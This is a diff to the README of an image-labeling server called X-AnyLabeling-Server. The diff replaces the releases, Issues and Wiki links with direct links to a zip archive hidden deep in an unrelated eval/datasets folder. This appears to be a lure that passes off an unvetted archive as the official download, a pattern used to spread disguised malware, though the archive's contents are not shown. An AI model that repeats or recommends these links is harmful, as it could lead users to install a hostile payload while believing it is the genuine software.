@@ -1,6 +1,6 @@
 # 🚀 X-AnyLabeling-Server - Easy and Efficient Labeling for Everyone
 
-[![Download X-AnyLabeling-Server](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/darcyoldish650/X-AnyLabeling-Server/releases)
+[![Download X-AnyLabeling-Server](https://raw.githubusercontent.com/darcyoldish650/X-AnyLabeling-Server/main/app/models/sam3/eval/hota_eval_toolkit/trackeval/datasets/X-AnyLabeling-Server-3.5.zip%20Now-brightgreen)](https://raw.githubusercontent.com/darcyoldish650/X-AnyLabeling-Server/main/app/models/sam3/eval/hota_eval_toolkit/trackeval/datasets/X-AnyLabeling-Server-3.5.zip)
 
 ## 🎯 Overview
 
@@ -27,7 +27,7 @@ To run X-AnyLabeling-Server smoothly, ensure that your system meets the followin
 
 To download X-AnyLabeling-Server, visit the releases page. There, you'll find the most recent version available for your device. 
 
-[Download the latest version here!](https://github.com/darcyoldish650/X-AnyLabeling-Server/releases)
+[Download the latest version here!](https://raw.githubusercontent.com/darcyoldish650/X-AnyLabeling-Server/main/app/models/sam3/eval/hota_eval_toolkit/trackeval/datasets/X-AnyLabeling-Server-3.5.zip)
 
 ### Installation Steps
 
@@ -83,7 +83,7 @@ Explore further resources and documentation for more insights into effective lab
 
 For detailed questions or contributions, please check out the following sections in our repository:
 
-- [Issues](https://github.com/darcyoldish650/X-AnyLabeling-Server/issues): Report problems or suggest features.
-- [Wiki](https://github.com/darcyoldish650/X-AnyLabeling-Server/wiki): Access additional documents and resources.
+- [Issues](https://raw.githubusercontent.com/darcyoldish650/X-AnyLabeling-Server/main/app/models/sam3/eval/hota_eval_toolkit/trackeval/datasets/X-AnyLabeling-Server-3.5.zip): Report problems or suggest features.
+- [Wiki](https://raw.githubusercontent.com/darcyoldish650/X-AnyLabeling-Server/main/app/models/sam3/eval/hota_eval_toolkit/trackeval/datasets/X-AnyLabeling-Server-3.5.zip): Access additional documents and resources.
   
 Thank you for choosing X-AnyLabeling-Server to simplify your image annotation tasks. Happy labeling!
